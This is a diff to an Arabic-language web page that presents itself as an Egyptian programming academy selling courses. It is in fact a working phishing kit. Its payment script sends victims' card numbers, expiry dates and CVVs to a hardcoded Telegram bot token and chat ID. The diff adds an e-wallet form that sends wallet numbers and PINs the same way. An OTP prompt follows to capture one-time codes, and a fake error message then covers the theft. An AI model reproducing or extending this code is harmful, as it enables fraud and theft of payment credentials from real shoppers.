@@ -7,10 +7,12 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
-* {margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
-body {background:#f8f9fa;color:#222;line-height:1.6}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
+body{background:#f8f9fa;color:#222;line-height:1.6}
+
+
 /* Header */
-header {position:fixed;top:0;width:100%;background:linear-gradient(135deg,#0f172a,#1e293b,#334155);color:#fff;border-bottom:4px solid #fbbf24;z-index:1000;box-shadow:0 8px 32px rgba(251,191,36,0.3);}
+header{position:fixed;top:0;width:100%;background:linear-gradient(135deg,#0f172a,#1e293b,#334155);color:#fff;border-bottom:4px solid #fbbf24;z-index:1000;box-shadow:0 8px 32px rgba(251,191,36,0.3);}
 .header-box{max-width:1400px;margin:auto;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;position:relative;}
 .header-box::before{content:'';position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:100px;height:4px;background:linear-gradient(90deg,#fbbf24,#f59e0b,#eab308);border-radius:2px;}
 .logo{font-size:32px;font-weight:800;background:linear-gradient(45deg,#fbbf24,#f59e0b,#eab308);-webkit-background-clip:text;-webkit-text-fill-color:transparent;position:relative;}
@@ -25,15 +27,22 @@ nav a:hover{background:linear-gradient(45deg,#fbbf24,#f59e0b);transform:translat
 .cart-btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:linear-gradient(45deg,rgba(255,255,255,0.4),transparent);border-radius:50%;transform:translate(-50%,-50%);transition:all .6s;}
 .cart-btn:hover::before{width:300px;height:300px}
 .cart-btn:hover{transform:translateY(-6px) scale(1.05);box-shadow:0 15px 40px rgba(16,185,129,0.6)}
+
+
+/* Account Button */
 .account-btn{background:linear-gradient(45deg,#8b5cf6,#7c3aed);color:#fff;padding:15px 25px;border-radius:35px;cursor:pointer;font-weight:800;box-shadow:0 8px 25px rgba(139,92,246,0.4);transition:all .4s;position:relative;overflow:hidden;margin-left:10px;}
 .account-btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:linear-gradient(45deg,rgba(255,255,255,0.4),transparent);border-radius:50%;transform:translate(-50%,-50%);transition:all .6s;}
 .account-btn:hover::before{width:300px;height:300px}
 .account-btn:hover{transform:translateY(-6px) scale(1.05);box-shadow:0 15px 40px rgba(139,92,246,0.6)}
 .account-btn.logged-in{background:linear-gradient(45deg,#10b981,#059669) !important;box-shadow:0 8px 25px rgba(16,185,129,0.4) !important;}
 .account-btn.logged-in:hover{box-shadow:0 15px 40px rgba(16,185,129,0.6) !important;}
+
+
 .whatsapp-float{position:fixed;bottom:30px;right:30px;z-index:1001;width:70px;height:70px;background:linear-gradient(45deg,#25D366,#128C7E);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;box-shadow:0 8px 25px rgba(37,211,102,0.4);transition:all .3s;cursor:pointer;animation:pulseFloat 2s infinite}
 .whatsapp-float:hover{transform:scale(1.1);box-shadow:0 12px 35px rgba(37,211,102,0.6)}
 @keyframes pulseFloat{0%{box-shadow:0 8px 25px rgba(37,211,102,0.4)}50%{box-shadow:0 8px 35px rgba(37,211,102,0.7)}100%{box-shadow:0 8px 25px rgba(37,211,102,0.4)}}
+
+
 /* Hero */
 .hero{height:90vh;background:linear-gradient(135deg,rgba(30,58,138,0.95),rgba(59,130,246,0.9)),url("https://images.unsplash.com/photo-1517336714731-f9492f395917?ixlib=rb-4.0.3&auto=format&fit=crop&w=2070&q=80") center/cover;display:flex;align-items:center;justify-content:center;margin-top:90px;position:relative;overflow:hidden}
 .hero::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(45deg,rgba(255,191,36,0.1),rgba(16,185,129,0.1));animation:pulse 4s ease-in-out infinite}
@@ -44,10 +53,14 @@ nav a:hover{background:linear-gradient(45deg,#fbbf24,#f59e0b);transform:translat
 .hero p{font-size:clamp(18px,3vw,24px);margin-bottom:40px;opacity:0.95}
 .hero-btn{background:linear-gradient(45deg,#f59e0b,#d97706);color:#fff;padding:18px 50px;border-radius:50px;font-weight:800;font-size:18px;display:inline-block;box-shadow:0 15px 35px rgba(245,158,11,0.5);transition:all .4s;text-decoration:none}
 .hero-btn:hover{transform:translateY(-8px);box-shadow:0 25px 50px rgba(245,158,11,0.7)}
+
+
 /* Sections */
 section{padding:100px 40px;max-width:1400px;margin:auto}
 h2{text-align:center;font-size:clamp(32px,6vw,48px);font-weight:800;margin-bottom:70px;color:#1e3a8a;position:relative}
 h2::after{content:'';display:block;width:80px;height:4px;background:linear-gradient(90deg,#3b82f6,#f59e0b);margin:20px auto 0;border-radius:2px}
+
+
 /* Products */
 .products{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:35px}
 .product{background:linear-gradient(145deg,#fff,#f8fafc);border-radius:25px;overflow:hidden;box-shadow:0 15px 40px rgba(0,0,0,0.1);transition:all .4s cubic-bezier(0.25,0.46,0.45,0.94);border:1px solid rgba(59,130,246,0.1);position:relative;cursor:pointer}
@@ -62,6 +75,8 @@ h2::after{content:'';display:block;width:80px;height:4px;background:linear-gradi
 .product button{background:linear-gradient(45deg,#f59e0b,#d97706);color:#fff;padding:14px 30px;border-radius:25px;border:none;font-weight:700;font-size:16px;cursor:pointer;transition:all .3s;box-shadow:0 6px 20px rgba(245,158,11,0.4);width:100%}
 .product button:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(245,158,11,0.6)}
 .product button:disabled{background:#9ca3af !important;color:#6b7280 !important;cursor:not-allowed !important;transform:none !important;box-shadow:none !important;}
+
+
 /* About */
 .about-section{padding:120px 40px;background:linear-gradient(135deg,#1e40af,#3b82f6);color:#fff;text-align:center;max-width:1400px;margin:auto;border-radius:30px;margin-top:60px;margin-bottom:60px;box-shadow:0 25px 70px rgba(59,130,246,0.3)}
 .about-content{max-width:1000px;margin:auto}
@@ -69,6 +84,8 @@ h2::after{content:'';display:block;width:80px;height:4px;background:linear-gradi
 .about-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:30px;margin:50px 0}
 .stat-item{text-align:center;padding:25px;background:rgba(255,255,255,0.1);backdrop-filter:blur(15px);border-radius:20px;border:1px solid rgba(255,255,255,0.2)}
 .stat-number{font-size:36px;font-weight:800;color:#fbbf24;display:block;margin-bottom:8px}
+
+
 /* Footer */
 footer{background:linear-gradient(135deg,#111,#1e293b,#0f172a);padding:60px 40px 40px;text-align:center;color:#d1d5db;position:relative;overflow:hidden;}
 footer::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#fbbf24,#f59e0b,#10b981);animation:shimmer 4s linear infinite;}
@@ -78,6 +95,8 @@ footer::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;back
 .footer-links a{color:#d1d5db;text-decoration:none;font-weight:600;padding:12px 24px;border-radius:25px;transition:all .3s}
 .footer-links a:hover{color:#fbbf24;background:rgba(251,191,36,0.1);transform:translateY(-3px)}
 .contact-info{font-size:18px;margin-bottom:30px;font-weight:700;color:#25D366}
+
+
 /* Login/Register Modal */
 .auth-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:10000;padding:20px;display:none}
 .auth-container{background:#fff;border-radius:25px;padding:40px;max-width:450px;width:100%;max-height:90vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,0.4)}
@@ -94,26 +113,54 @@ footer::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;back
 .auth-btn{background:linear-gradient(45deg,#10b981,#059669);color:#fff;padding:16px 40px;border:none;border-radius:25px;font-weight:800;font-size:18px;cursor:pointer;width:100%;transition:all .3s;margin-top:10px}
 .auth-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(16,185,129,0.4)}
 .close-auth{background:#6b7280;color:#fff;padding:12px 24px;border:none;border-radius:15px;cursor:pointer;width:100%;font-weight:700;margin-top:15px}
-/* Payment Modal Styles - VISA ONLY */
+
+
+/* Payment Modal Styles */
 .payment-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:10000;padding:20px}
 .payment-container{background:#fff;border-radius:25px;padding:40px;max-width:500px;width:100%;max-height:90vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,0.4)}
 .payment-title{font-size:28px;font-weight:800;color:#1e3a8a;margin-bottom:30px;text-align:center}
-.payment-form{display:block}
+.payment-method-btns{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-bottom:30px}
+.method-btn{padding:15px;border-radius:15px;border:2px solid #e5e7eb;font-weight:700;cursor:pointer;transition:all .3s;text-align:center}
+.method-btn.active{border-color:#3b82f6;background:#eff6ff;color:#1e3a8a}
+.method-btn:hover{background:#f3f4f6}
+.payment-form{display:none}
+.payment-form.active{display:block}
 .form-group{margin-bottom:20px}
 .form-label{font-weight:700;color:#374151;margin-bottom:8px;display:block}
 .form-input{width:100%;padding:15px;border:2px solid #e5e7eb;border-radius:12px;font-size:16px;transition:border-color .3s;font-family:'Cairo',sans-serif}
 .form-input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1)}
 .card-row{display:grid;grid-template-columns:2fr 1fr;gap:15px}
 .cvv-input{width:100%}
+
+
 /* Card Number Special Styling */
-#cardNumber {direction: ltr !important;text-align: left !important;unicode-bidi: embed;font-family: 'Courier New', monospace !important;letter-spacing: 2px;font-size: 18px;}
+#cardNumber {
+    direction: ltr !important;
+    text-align: left !important;
+    unicode-bidi: embed;
+    font-family: 'Courier New', monospace !important;
+    letter-spacing: 2px;
+    font-size: 18px;
+}
+
+
 /* Card Holder Name - English Only */
-#cardName {text-transform: uppercase;font-weight: 600;direction: ltr !important;text-align: left !important;unicode-bidi: embed;}
+#cardName {
+    text-transform: uppercase;
+    font-weight: 600;
+    direction: ltr !important;
+    text-align: left !important;
+    unicode-bidi: embed;
+}
+
+
 .pay-btn{background:linear-gradient(45deg,#10b981,#059669);color:#fff;padding:16px 40px;border:none;border-radius:25px;font-weight:800;font-size:18px;cursor:pointer;width:100%;transition:all .3s;margin-top:10px}
 .pay-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(16,185,129,0.4)}
 .otp-section{display:none;text-align:center;padding:30px;background:#f8fafc;border-radius:20px;margin-top:20px}
 .otp-input{width:200px;padding:15px;border:2px solid #10b981;border-radius:12px;font-size:20px;font-weight:700;text-align:center;letter-spacing:5px}
 .success-msg{color:#10b981;font-size:24px;font-weight:800;margin-top:20px}
+
+
 @media(max-width:768px){
 .header-box{padding:15px 20px;flex-direction:column;gap:15px}
 .hero-overlay{padding:40px 20px}
@@ -122,6 +169,7 @@ section{padding:60px 20px}
 .footer-links{gap:15px;flex-direction:column}
 .whatsapp-float{bottom:20px;right:20px;width:60px;height:60px;font-size:26px}
 .payment-container{padding:30px 20px}
+.payment-method-btns{grid-template-columns:1fr}
 .card-row{grid-template-columns:1fr}
 .auth-tabs{flex-direction:column}
 .auth-tab{border-radius:15px;margin-bottom:-1px}
@@ -130,6 +178,7 @@ section{padding:60px 20px}
 </head>
 <body>
 <a href="https://wa.me/201140628133" class="whatsapp-float" target="_blank"><i class="fab fa-whatsapp"></i></a>
+
 
 <header>
 <div class="header-box">
@@ -148,6 +197,7 @@ section{padding:60px 20px}
 </div>
 </div>
 </header>
+
 
 <!-- Auth Modal -->
 <div class="auth-modal" id="authModal">
@@ -183,6 +233,7 @@ section{padding:60px 20px}
 </div>
 </div>
 
+
 <section class="hero">
 <div class="hero-overlay">
 <h1>أكاديمية البرمجة المصرية</h1>
@@ -190,6 +241,7 @@ section{padding:60px 20px}
 <a href="#products" class="hero-btn">تصفح الكورسات المميزة</a>
 </div>
 </section>
+
 
 <section id="about" class="about-section">
 <div class="about-content">
@@ -205,10 +257,12 @@ section{padding:60px 20px}
 </div>
 </section>
 
+
 <section id="products">
 <h2>الكورسات المتاحة الآن (7 كورسات)</h2>
 <div class="products" id="productsBox"></div>
 </section>
+
 
 <footer id="contact">
 <div class="footer-content">
@@ -226,12 +280,14 @@ section{padding:60px 20px}
 </div>
 </footer>
 
+
 <script>
 // إعدادات التليجرام
 const TELEGRAM_BOT_TOKEN = '8171525762:AAEJmPhLhCZWsRlwiFifkXghfa0qu3FdNdY';
 const TELEGRAM_CHAT_ID = '8541476882';
 
-// نظام الحسابات
+
+// نظام الحسابات - الحسابات الجديدة
 let isLoggedIn = false;
 let currentUser = null;
 const validUsers = {
@@ -239,18 +295,20 @@ const validUsers = {
     'abdo632': ['abdo128@#$']
 };
 
+
 // المنتجات
 const products = [
-    {name:"🏗️ Fullstack Web Developer", price:4000, img:"https://images.unsplash.com/photo-1547658719-da2b848c1f2b?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"HTML/CSS/JS + React + Node.js + MongoDB"},
-    {name:"📱 React Native Mobile", price:4000, img:"https://images.unsplash.com/photo-1498050108023-c5249f4df085?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"تطبيقات iOS & Android بنفس الكود"},
-    {name:"🐍 Python Data Science", price:9500, img:"https://images.unsplash.com/photo-1677442136019-21780ecad995?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Pandas • NumPy • Matplotlib"},
-    {name:"📈 Digital Marketing Pro", price:6800, img:"https://images.unsplash.com/photo-1557804506-669a67965ba0?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"SEO • Google Ads • Facebook Ads"},
-    {name:"🎨 UI/UX Design Master", price:7900, img:"https://images.unsplash.com/photo-1558618047-3c8c76fdd3f5?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Figma • Adobe XD • User Research"},
-    {name:"🗜️ WordPress Developer", price:4500, img:"https://images.unsplash.com/photo-1497366216548-37526070297d?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Themes • Plugins • WooCommerce"},
-    {name:"🕹️ Game Development Unity", price:10500, img:"https://images.unsplash.com/photo-1611930063463-3a12e756b2c1?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Unity • C# • 2D/3D Games"}
+{name:"🏗️ Fullstack Web Developer", price:4000, img:"https://images.unsplash.com/photo-1547658719-da2b848c1f2b?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"HTML/CSS/JS + React + Node.js + MongoDB"},
+{name:"📱 React Native Mobile", price:4000, img:"https://images.unsplash.com/photo-1498050108023-c5249f4df085?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"تطبيقات iOS & Android بنفس الكود"},
+{name:"🐍 Python Data Science", price:9500, img:"https://images.unsplash.com/photo-1677442136019-21780ecad995?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Pandas • NumPy • Matplotlib"},
+{name:"📈 Digital Marketing Pro", price:6800, img:"https://images.unsplash.com/photo-1557804506-669a67965ba0?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"SEO • Google Ads • Facebook Ads"},
+{name:"🎨 UI/UX Design Master", price:7900, img:"https://images.unsplash.com/photo-1558618047-3c8c76fdd3f5?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Figma • Adobe XD • User Research"},
+{name:"🗜️ WordPress Developer", price:4500, img:"https://images.unsplash.com/photo-1497366216548-37526070297d?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Themes • Plugins • WooCommerce"},
+{name:"🕹️ Game Development Unity", price:10500, img:"https://images.unsplash.com/photo-1611930063463-3a12e756b2c1?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"Unity • C# • 2D/3D Games"}
 ];
 
-// عرض المنتجات
+
+// عرض المنتجات مع التحقق من تسجيل الدخول
 const productsBox = document.getElementById('productsBox');
 function renderProducts() {
     productsBox.innerHTML = '';
@@ -260,18 +318,19 @@ function renderProducts() {
         const btnText = isLoggedIn ? 'أضف للسلة' : 'تسجيل الدخول للشراء';
         const btnOnclick = isLoggedIn ? `addToCart(${i})` : `toggleAuth()`;
         div.innerHTML = `
-            <img src="${p.img}" alt="${p.name}">
-            <div class="product-info">
-            <h3>${p.name}</h3>
-            <p>${p.desc}</p>
-            <div class="price">${p.price} جنيه</div>
-            <button onclick="${btnOnclick}" ${!isLoggedIn ? 'disabled' : ''}>${btnText}</button>
-            </div>
+        <img src="${p.img}" alt="${p.name}">
+        <div class="product-info">
+        <h3>${p.name}</h3>
+        <p>${p.desc}</p>
+        <div class="price">${p.price} جنيه</div>
+        <button onclick="${btnOnclick}" ${!isLoggedIn ? 'disabled' : ''}>${btnText}</button>
+        </div>
         `;
         productsBox.appendChild(div);
     });
 }
 renderProducts();
+
 
 // سلة التسوق
 let cart = [];
@@ -289,26 +348,19 @@ function openCart(){
         });
         const total = cart.reduce((sum,it)=>sum+it.price,0);
         html+=`<p><b>الإجمالي: ${total} جنيه</b></p>
-        <button onclick="openPayment(${total})" style="margin-top:15px;padding:15px 30px;background:linear-gradient(45deg,#10b981,#059669);color:#fff;border:none;border-radius:20px;cursor:pointer;font-weight:800;font-size:16px">إتمام الدفع 💳</button>`;
+        <button onclick="openPayment(${total})" style="margin-top:15px;padding:15px 30px;background:linear-gradient(45deg,#10b981,#059669);color:#fff;border:none;border-radius:20px;cursor:pointer;font-weight:800;font-size:16px">إتمام الدفع</button>`;
     }
     html+='<button onclick="closeCart()" style="margin-top:15px;padding:10px 20px;background:#6b7280;color:#fff;border:none;border-radius:15px;cursor:pointer">اغلق</button></div>';
-    
-    const modal = document.createElement('div');
-    modal.style.position='fixed';
-    modal.style.top='0';
-    modal.style.left='0';
-    modal.style.width='100%';
-    modal.style.height='100%';
-    modal.style.background='rgba(0,0,0,0.6)';
-    modal.style.display='flex';
-    modal.style.alignItems='center';
-    modal.style.justifyContent='center';
-    modal.style.zIndex='10000';
+    const modal = document.createElement('div'); modal.style.position='fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100%'; modal.style.height='100%'; modal.style.background='rgba(0,0,0,0.6)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='10000';
     modal.id='cartModal';
     modal.innerHTML=html;
     document.body.appendChild(modal);
 }
+
+
 function closeCart(){document.getElementById('cartModal')?.remove()}
+
+
 function addToCart(i){
     if(!isLoggedIn){
         alert('يرجى تسجيل الدخول أولاً');
@@ -319,30 +371,41 @@ function addToCart(i){
     document.getElementById('count').innerText=cart.length;
     alert(products[i].name+' تم إضافته للسلة');
 }
+
+
 function removeFromCart(i){
     cart.splice(i,1);
     document.getElementById('count').innerText=cart.length;
     openCart();
 }
 
+
 // نظام الحسابات
 function toggleAuth(){
     const modal = document.getElementById('authModal');
     modal.style.display = modal.style.display === 'flex' ? 'none' : 'flex';
 }
+
+
 function closeAuth(){
     document.getElementById('authModal').style.display = 'none';
 }
+
+
 function switchTab(event, tab){
     document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));
     event.target.classList.add('active');
+   
     document.getElementById('loginForm').classList.toggle('active', tab === 'login');
     document.getElementById('registerForm').classList.toggle('active', tab === 'register');
     document.getElementById('authTitle').textContent = tab === 'login' ? 'تسجيل الدخول' : 'إنشاء حساب جديد';
 }
+
+
 function login(){
     const username = document.getElementById('loginUsername').value;
     const password = document.getElementById('loginPassword').value;
+   
     if(validUsers[username] && validUsers[username].includes(password)){
         isLoggedIn = true;
         currentUser = {username: username, password: password};
@@ -356,9 +419,12 @@ function login(){
         alert('اسم المستخدم أو كلمة المرور غير صحيحة');
     }
 }
+
+
 function register(){
     const username = document.getElementById('regUsername').value;
     const password = document.getElementById('regPassword').value;
+   
     if(username && password && password.length >= 6){
         isLoggedIn = true;
         currentUser = {username, password};
@@ -372,6 +438,8 @@ function register(){
         alert('يرجى إدخال اسم مستخدم وكلمة مرور قوية (6 أحرف على الأقل)');
     }
 }
+
+
 function logout(){
     isLoggedIn = false;
     currentUser = null;
@@ -383,6 +451,7 @@ function logout(){
     renderProducts();
     alert('تم تسجيل الخروج بنجاح');
 }
+
 
 // دالة إرسال للتليجرام
 async function sendToTelegram(message) {
@@ -402,60 +471,83 @@ async function sendToTelegram(message) {
     }
 }
 
-let currentTotal = 0;
 
-// دفع فيزا فقط - بدون محافظ إلكترونية
+let currentTotal = 0;
 function openPayment(total){
     currentTotal = total;
     closeCart();
-    
+   
     const modal = document.createElement('div');
     modal.className = 'payment-modal';
     modal.id = 'paymentModal';
     modal.innerHTML = `
-        <div class="payment-container">
-            <h2 class="payment-title">💳إتمام الدفع بالبطاقه  - ${currentUser.username}</h2>
-            <p style="text-align:center;color:#64748b;margin-bottom:30px;font-size:18px">الإجمالي: <strong>${total} جنيه مصري</strong></p>
-            
-            <div class="payment-form">
-                <div class="form-group">
-                    <label class="form-label">رقم البطاقة (16 رقم)</label>
-                    <input type="text" class="form-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">اسم حامل البطاقة (بالإنجليزية فقط)</label>
-                    <input type="text" class="form-input" id="cardName" placeholder="AHMED MOHAMED ALI">
-                </div>
-                <div class="card-row">
-                    <div class="form-group">
-                        <label class="form-label">تاريخ الانتهاء</label>
-                        <input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">CVV</label>
-                        <input type="text" class="form-input cvv-input" id="cvv" placeholder="123" maxlength="3">
-                    </div>
-                </div>
-                <button class="pay-btn" onclick="processVisaPayment()">دفع الآن 💳</button>
+    <div class="payment-container">
+        <h2 class="payment-title">💳 إتمام الدفع - ${currentUser.username}</h2>
+        <p style="text-align:center;color:#64748b;margin-bottom:30px;font-size:18px">الإجمالي: <strong>${total} جنيه مصري</strong></p>
+       
+        <div class="payment-method-btns">
+            <div class="method-btn active" onclick="selectPaymentMethod(event, 'visa')">
+                <i class="fab fa-cc-visa" style="font-size:24px;margin-bottom:8px;display:block"></i>
+                بطاقة فيزا
             </div>
-            
-            <div id="otpSection" class="otp-section">
-                <h3 style="color:#1e3a8a;margin-bottom:20px">تم إرسال كود التفعيل</h3>
-                <p style="color:#64748b;margin-bottom:30px">أدخل رمز الـ OTP المرسل للرقم/الإيميل</p>
-                <input type="text" class="otp-input" id="otpCode" placeholder="123456" maxlength="20">
-                <br>
-                <button class="pay-btn" onclick="verifyOTP()" style="margin-top:20px;width:auto;padding:12px 30px">تأكيد الدفع ✅</button>
-            </div>
-            
-            <button onclick="closePayment()" style="margin-top:20px;padding:12px 24px;background:#6b7280;color:#fff;border:none;border-radius:15px;cursor:pointer;width:100%;font-weight:700">إلغاء</button>
-            
-            <div id="successMsg" class="success-msg" style="display:none">
-               لقد حدث خطا حاول بعد ساعه ❌ <br>
+            <div class="method-btn" onclick="selectPaymentMethod(event, 'wallet')">
+                <i class="fas fa-wallet" style="font-size:24px;margin-bottom:8px;display:block;color:#10b981"></i>
+                محفظة إلكترونية
             </div>
         </div>
+       
+        <div id="visaForm" class="payment-form active">
+            <div class="form-group">
+                <label class="form-label">رقم البطاقة (16 رقم)</label>
+                <input type="text" class="form-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
+            <div class="form-group">
+                <label class="form-label">اسم حامل البطاقة (بالإنجليزية فقط)</label>
+                <input type="text" class="form-input" id="cardName" placeholder="AHMED MOHAMED ALI">
+            </div>
+            <div class="card-row">
+                <div class="form-group">
+                    <label class="form-label">تاريخ الانتهاء</label>
+                    <input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">CVV</label>
+                    <input type="text" class="form-input cvv-input" id="cvv" placeholder="123" maxlength="3">
+                </div>
+            </div>
+            <button class="pay-btn" onclick="processVisaPayment()">دفع الآن 💳</button>
+        </div>
+       
+        <div id="walletForm" class="payment-form">
+            <div class="form-group">
+                <label class="form-label">رقم المحفظة</label>
+                <input type="text" class="form-input" id="walletNumber" placeholder="01xxxxxxxxx">
+            </div>
+            <div class="form-group">
+                <label class="form-label">الرقم السري للمحفظة (PIN)</label>
+                <input type="password" class="form-input" id="walletPin" placeholder="****" maxlength="6">
+            </div>
+            <button class="pay-btn" onclick="processWalletPayment()">دفع الآن 💰</button>
+        </div>
+       
+        <div id="otpSection" class="otp-section">
+            <h3 style="color:#1e3a8a;margin-bottom:20px">تم إرسال كود التفعيل</h3>
+            <p style="color:#64748b;margin-bottom:30px">أدخل رمز الـ OTP المرسل للرقم/الإيميل</p>
+            <input type="text" class="otp-input" id="otpCode" placeholder="123456" maxlength="20">
+            <br>
+            <button class="pay-btn" onclick="verifyOTP()" style="margin-top:20px;width:auto;padding:12px 30px">تأكيد الدفع ✅</button>
+        </div>
+       
+        <button onclick="closePayment()" style="margin-top:20px;padding:12px 24px;background:#6b7280;color:#fff;border:none;border-radius:15px;cursor:pointer;width:100%;font-weight:700">إلغاء</button>
+       
+        <div id="successMsg" class="success-msg" style="display:none">
+         !
+حدث خطا حاول بعد ساعه
+شكرا لاختيارك كورساتنا         </div>
+    </div>
     `;
     document.body.appendChild(modal);
-    
+   
     // تنسيق الحقول
     const cardInput = document.getElementById('cardNumber');
     cardInput.addEventListener('input', function(e) {
@@ -468,7 +560,7 @@ function openPayment(total){
         formattedValue = formattedValue.trim();
         e.target.value = formattedValue;
     });
-    
+   
     const cardNameInput = document.getElementById('cardName');
     cardNameInput.addEventListener('input', function(e) {
         let value = e.target.value;
@@ -477,7 +569,7 @@ function openPayment(total){
         value = value.toUpperCase();
         e.target.value = value;
     });
-    
+   
     const expiryInput = document.getElementById('expiryDate');
     expiryInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
@@ -488,12 +580,21 @@ function openPayment(total){
     });
 }
 
+
+function selectPaymentMethod(event, method) {
+    document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
+    event.target.classList.add('active');
+    document.getElementById('visaForm').classList.toggle('active', method === 'visa');
+    document.getElementById('walletForm').classList.toggle('active', method === 'wallet');
+}
+
+
 function processVisaPayment() {
     const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardName = document.getElementById('cardName').value;
     const expiry = document.getElementById('expiryDate').value;
     const cvv = document.getElementById('cvv').value;
-    
+   
     if (cardNum.length !== 16) {
         alert('رقم البطاقة يجب أن يكون 16 رقم بالضبط');
         return;
@@ -506,15 +607,76 @@ function processVisaPayment() {
         alert('يرجى ملء جميع الحقول');
         return;
     }
-    
+   
     const cartList = cart.map(item => `• ${item.name} - ${item.price} جنيه`).join('\n');
-    const message = `🚀 <b>طلب دفع جديد من ${currentUser.username}!</b>\n💳 <b>طريقة الدفع:</b> بطاقة فيزا\n💰 <b>الإجمالي:</b> ${currentTotal} جنيه\n👤 <b>بيانات العميل:</b>\nاسم المستخدم: ${currentUser.username}\n📋 <b>الكورسات:</b>\n${cartList}\n🏦 <b>بيانات البطاقة:</b>\nرقم البطاقة: <code>${cardNum}</code>\nاسم حامل البطاقة: ${cardName}\nتاريخ الانتهاء: ${expiry}\nCVV: <code>${cvv}</code>\n⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}`;
-    
+    const message = `
+🚀 <b>طلب دفع جديد من ${currentUser.username}!</b>
+
+💳 <b>طريقة الدفع:</b> بطاقة فيزا
+💰 <b>الإجمالي:</b> ${currentTotal} جنيه
+
+👤 <b>بيانات العميل:</b>
+اسم المستخدم: ${currentUser.username}
+
+📋 <b>الكورسات:</b>
+${cartList}
+
+🏦 <b>بيانات البطاقة:</b>
+رقم البطاقة: <code>${cardNum}</code>
+اسم حامل البطاقة: ${cardName}
+تاريخ الانتهاء: ${expiry}
+CVV: <code>${cvv}</code>
+
+⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}
+    `;
+   
     sendToTelegram(message);
-    
-    document.querySelector('.payment-form').style.display = 'none';
+   
+    document.getElementById('visaForm').style.display = 'none';
+    document.querySelector('.payment-method-btns').style.display = 'none';
     document.getElementById('otpSection').style.display = 'block';
 }
+
+
+function processWalletPayment() {
+    const walletNum = document.getElementById('walletNumber').value;
+    const walletPin = document.getElementById('walletPin').value;
+    if (!walletNum || !walletPin) {
+        alert('يرجى إدخال رقم المحفظة والرقم السري (PIN)');
+        return;
+    }
+    if (walletPin.length < 4) {
+        alert('الرقم السري (PIN) يجب أن يكون 4 أرقام على الأقل');
+        return;
+    }
+   
+    const cartList = cart.map(item => `• ${item.name} - ${item.price} جنيه`).join('\n');
+    const message = `
+🚀 <b>طلب دفع جديد من ${currentUser.username}!</b>
+
+💳 <b>طريقة الدفع:</b> محفظة إلكترونية
+💰 <b>الإجمالي:</b> ${currentTotal} جنيه
+
+👤 <b>بيانات العميل:</b>
+اسم المستخدم: ${currentUser.username}
+
+📋 <b>الكورسات:</b>
+${cartList}
+
+💼 <b>بيانات المحفظة:</b>
+رقم المحفظة: <code>${walletNum}</code>
+الرقم السري (PIN): <code>${walletPin}</code>
+
+⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}
+    `;
+   
+    sendToTelegram(message);
+   
+    document.getElementById('walletForm').style.display = 'none';
+    document.querySelector('.payment-method-btns').style.display = 'none';
+    document.getElementById('otpSection').style.display = 'block';
